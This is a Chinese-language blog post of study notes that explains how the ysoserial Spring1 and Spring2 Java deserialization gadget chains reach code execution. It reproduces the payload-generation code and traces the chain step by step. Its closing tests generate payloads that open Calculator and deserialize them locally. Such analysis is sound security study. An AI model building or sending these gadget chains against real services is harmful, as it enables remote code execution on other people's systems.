---
title: "Java 反序列化 ysoserial Spring"
layout: post
date: 2019-05-02 11:11
headerImage: false
tag:
- Java
- ysoserial
- 反序列化
- Spring
blog: true
star: false
author: b1ngz
description: Java ysoserial Spring Note
---

# 简介

Java 反序列化 ysoserial [Spring1.java](https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/Spring1.java) 和 [Spring2.java](https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/Spring2.java) payload 学习笔记

# 知识点

以下是两个 payload 中涉及到的知识点：

- 使用 `TemplatesImpl` 的 `_bytecodes` 字段存储恶意字节码，利用 `newTransformer()` 方法触发恶意代码执行 ，具体可以参考 [Java反序列 Jdk7u21 Payload 学习笔记](<https://b1ngz.github.io/java-deserialization-jdk7u21-gadget-note/>) 中关于 `TemplatesImpl` 的说明

- 利用 `AnnotationInvocationHandler` 控制代理方法调用的返回值。 在 `invoke()` 方法中的，当 proxy class 调用的方法名不是 `equals`、`toString`、`hashCode`、`annotationType` 时，会从 `memberValues` (类型为 Map) 取 key 为 `method` 对应的值。因为 `memberValues` 是可控的，因此可以指定某个方法的返回值，具体可参考下面的代码

  ```java
  class AnnotationInvocationHandler implements InvocationHandler, Serializable {
      private final Class<? extends Annotation> type;
      private final Map<String, Object> memberValues;
  
      AnnotationInvocationHandler(Class<? extends Annotation> type, Map<String, Object> memberValues) {
          this.type = type;
          this.memberValues = memberValues;
      }
  
      public Object invoke(Object proxy, Method method, Object[] args) {
          String member = method.getName();
          Class<?>[] paramTypes = method.getParameterTypes();
  
          // Handle Object and Annotation methods
          if (member.equals("equals") && paramTypes.length == 1 &&
              paramTypes[0] == Object.class)
              return equalsImpl(args[0]);
          assert paramTypes.length == 0;
          if (member.equals("toString"))
              return toStringImpl();
          if (member.equals("hashCode"))
              return hashCodeImpl();
          if (member.equals("annotationType"))
              return type;
  
          // Handle annotation member accessors
          Object result = memberValues.get(member);
      ...
          return result;
      }
  }
  ```

- 利用的反序列化类为 `org.springframework.core.SerializableTypeWrapper$MethodInvokeTypeProvider`

- 使用到了 Spring AOP 包中  `InvocationHandler`，分别为
  - `org.springframework.beans.factory.support.AutowireUtils$ObjectFactoryDelegatingInvocationHandler`
  - `org.springframework.core.SerializableTypeWrapper$MethodInvokeTypeProvider`

# Spring1

payload 生成代码如下

```java
public Object getObject(final String command) throws Exception {
    // 使用 TemplatesImpl 存储恶意字节码
    final Object templates = Gadgets.createTemplatesImpl(command);
    // 使用 AnnotationInvocationHandler 创建 ObjectFactory 接口的动态代理
    // 并且调用 objectFactoryProxy 的 getObject() 方法会返回 templates 对象
    final ObjectFactory objectFactoryProxy =
        Gadgets.createMemoitizedProxy(Gadgets.createMap("getObject", templates), ObjectFactory.class);
    // 使用 ObjectFactoryDelegatingInvocationHandler 代理 Type 和 Templates 接口，返回值类型为 Type 
    final Type typeTemplatesProxy = Gadgets.createProxy((InvocationHandler)
                                                        Reflections.getFirstCtor("org.springframework.beans.factory.support.AutowireUtils$ObjectFactoryDelegatingInvocationHandler")
                                                        .newInstance(objectFactoryProxy), Type.class, Templates.class);
    // 使用 AnnotationInvocationHandler 创建 TypeProvider 接口的动态代理
    // 并且调用 typeProviderProxy 的 getType() 方法会返回 typeTemplatesProxy 对象
    final Object typeProviderProxy = Gadgets.createMemoitizedProxy(
        Gadgets.createMap("getType", typeTemplatesProxy),
        forName("org.springframework.core.SerializableTypeWrapper$TypeProvider"));
    // 创建最终反序列化对象 MethodInvokeTypeProvider
    final Constructor mitpCtor = Reflections.getFirstCtor("org.springframework.core.SerializableTypeWrapper$MethodInvokeTypeProvider");
    // 实例化，构造方法中，会将 provider 属性的值设置为 typeProviderProxy
    final Object mitp = mitpCtor.newInstance(typeProviderProxy, Object.class.getMethod("getClass", new Class[] {}), 0);
    // 设置 methodName 属性的值为 newTransformer
    Reflections.setFieldValue(mitp, "methodName", "newTransformer");

    return mitp;
}
```

来看一下 `MethodInvokeTypeProvider` 类的 `readObject()` 方法

```java
private void readObject(ObjectInputStream inputStream) throws IOException, ClassNotFoundException {
    inputStream.defaultReadObject();
    // methodName 的值为 newTransformer
    // this.provider 为代理对象，即 typeProviderProxy
    Method method = ReflectionUtils.findMethod(this.provider.getType().getClass(), this.methodName);
    // 反射调用 this.provider 的 newTransformer 方法
    this.result = ReflectionUtils.invokeMethod(method, this.provider.getType());
}
```

因为 `this.provider` 即  `typeProviderProxy` 是代理对象，因此调用 `getType()` 方法，会调用关联 `InvocationHanlder` 的 `invoke()` 方法，根据 [知识点](#知识点) 中提到的  `AnnotationInvocationHandler`  可以指定方法返回值的特性，这里会返回 `typeTemplatesProxy` ，接着调用其 `getClass()` 方法，反射查找 `newTransformer` 方法

下一步会反射调用 `typeTemplatesProxy` 的 `newTransformer` 方法，因为 `typeTemplatesProxy` 也是一个代理对象，因此会调用 `ObjectFactoryDelegatingInvocationHandler` 的 `inovke()` 方法，其代码如下

```java
private static class ObjectFactoryDelegatingInvocationHandler implements InvocationHandler, Serializable {

    private final ObjectFactory<?> objectFactory;

    public ObjectFactoryDelegatingInvocationHandler(ObjectFactory<?> objectFactory) {
        this.objectFactory = objectFactory;
    }

    @Override
    public Object invoke(Object proxy, Method method, Object[] args) throws Throwable {
        String methodName = method.getName();
        if (methodName.equals("equals")) {
            return (proxy == args[0]);
        }
        else if (methodName.equals("hashCode")) {
            return System.identityHashCode(proxy);
        }
        else if (methodName.equals("toString")) {
            return this.objectFactory.toString();
        }
        try {
            // 最终执行代码
            return method.invoke(this.objectFactory.getObject(), args);
        }
        catch (InvocationTargetException ex) {
            throw ex.getTargetException();
        }
    }
}
```

根据代码可以得知，最终会执行到 

```java
return method.invoke(this.objectFactory.getObject(), args); 
```

那么这里的`objectFactory` 的值是什么？

根据 payload 中的生成代码

```java
final Object templates = Gadgets.createTemplatesImpl(command);

final ObjectFactory objectFactoryProxy =
        Gadgets.createMemoitizedProxy(Gadgets.createMap("getObject", templates), ObjectFactory.class);
```

值为 `objectFactoryProxy` ，也是一个代理对象，根据 `AnnotationInvocationHandler` 的特性，`objectFactory.getObject()`  的返回值为 `templates`，即最终调用的是 `TemplatesImpl` 的 `newTransformer()` 方法，触发恶意代码执行

整理一下关系

- `MethodInvokeTypeProvider.provider` => `typeProviderProxy`
- `typeProviderProxy.getType()` =>  `AnnotationInvocationHandler.invoke()`  => `typeTemplatesProxy`
- `typeTemplatesProxy.newTransformer()` => `ObjectFactoryDelegatingInvocationHandler.invoke()`
- `ObjectFactoryDelegatingInvocationHandler.objectFactory.getObject()` =>  `AnnotationInvocationHandler.invoke()`  => `TemplatesImpl`

精简的 Gadget chain 如下

```java
SerializableTypeWrapper.MethodInvokeTypeProvider.readObject()
    SerializableTypeWrapper.TypeProvider(Proxy).getType()
      AnnotationInvocationHandler.invoke()                      
    SerializableTypeWrapper.TypeProvider(Proxy).getType()
      AnnotationInvocationHandler.invoke()
    ReflectionUtils.invokeMethod()
      Templates(Proxy).newTransformer()
        AutowireUtils.ObjectFactoryDelegatingInvocationHandler.invoke()
          ObjectFactory(Proxy).getObject()
            AnnotationInvocationHandler.invoke()
          TemplatesImpl.newTransformer()
```



# Spring2

payload 生成代码如下

```java
public Object getObject ( final String command ) throws Exception {

    final Object templates = Gadgets.createTemplatesImpl(command);
    // 将 AdvisedSupport 的 target 属性值设置为 templates
    // AdvisedSupport 是 Spring AOP 的代理配置 managaer
    AdvisedSupport as = new AdvisedSupport();
    as.setTargetSource(new SingletonTargetSource(templates));
    // 使用 JdkDynamicAopProxy(实现了InvocationHandler接口) 来创建 Type 和 Templates 接口的动态代理
    // JdkDynamicAopProxy 的 advised 属性值为 as
    final Type typeTemplatesProxy = Gadgets.createProxy(
        (InvocationHandler) Reflections.getFirstCtor("org.springframework.aop.framework.JdkDynamicAopProxy").newInstance(as),
        Type.class,
        Templates.class);

    final Object typeProviderProxy = Gadgets.createMemoitizedProxy(
        Gadgets.createMap("getType", typeTemplatesProxy),
        forName("org.springframework.core.SerializableTypeWrapper$TypeProvider"));

    Object mitp = Reflections.createWithoutConstructor(forName("org.springframework.core.SerializableTypeWrapper$MethodInvokeTypeProvider"));
    Reflections.setFieldValue(mitp, "provider", typeProviderProxy);
    Reflections.setFieldValue(mitp, "methodName", "newTransformer");
    return mitp;
}
```

Spring2 和 Spring1 的反序列化过程大致相似，唯一不同的在于，这里使用了 AOP 包中另一个 ` InvocationHandler` -  `JdkDynamicAopProxy` 来创建 `typeTemplatesProxy`，来看一下它的 `invoke()` 方法，精简后如下

```java
final class JdkDynamicAopProxy implements AopProxy, InvocationHandler, Serializable {
    ...
        private final AdvisedSupport advised;
    ...

        public Object invoke(Object proxy, Method method, Object[] args) throws Throwable {
        MethodInvocation invocation;
        Object oldProxy = null;
        boolean setProxyContext = false;

        TargetSource targetSource = this.advised.targetSource;
        Class<?> targetClass = null;
        Object target = null;

        try {
            ....

                target = targetSource.getTarget();
            if (target != null) {
                targetClass = target.getClass();
            }

            List<Object> chain = this.advised.getInterceptorsAndDynamicInterceptionAdvice(method, targetClass);

            if (chain.isEmpty()) {
                // 调用 target 的 method 方法
                retVal = AopUtils.invokeJoinpointUsingReflection(target, method, args);
            }
            else {
                ....
            }

            ...
                return retVal;
        }
        finally {
            ....
        }
    }
}
```

经过一系列判断，最后会在 `this.advised.targetSource.getTarget()`  对象上调用 method，根据 paylaod 生成代码，这里的 target 为 `TemplatesImpl`，method 为 `newTransformer`，最终触发恶意代码执行

# 测试

```java
@Test
public void testSpring1() throws Exception {
    // mkdir -p /tmp/ysoserial
    // java -jar ysoserial-0.0.6-SNAPSHOT-all.jar Spring1 "open /Applications/Calculator.app" > /tmp/ysoserial/spring1.class
    ObjectInputStream ois = new ObjectInputStream(new FileInputStream(new File("/tmp/ysoserial/spring1.class")));
    ois.readObject();
}

@Test
public void testSpring2() throws Exception {
    // mkdir -p /tmp/ysoserial
    // java -jar ysoserial-0.0.6-SNAPSHOT-all.jar Spring2 "open /Applications/Calculator.app" > /tmp/ysoserial/spring2.class
    ObjectInputStream ois = new ObjectInputStream(new FileInputStream(new File("/tmp/ysoserial/spring2.class")));
    ois.readObject();
}
```
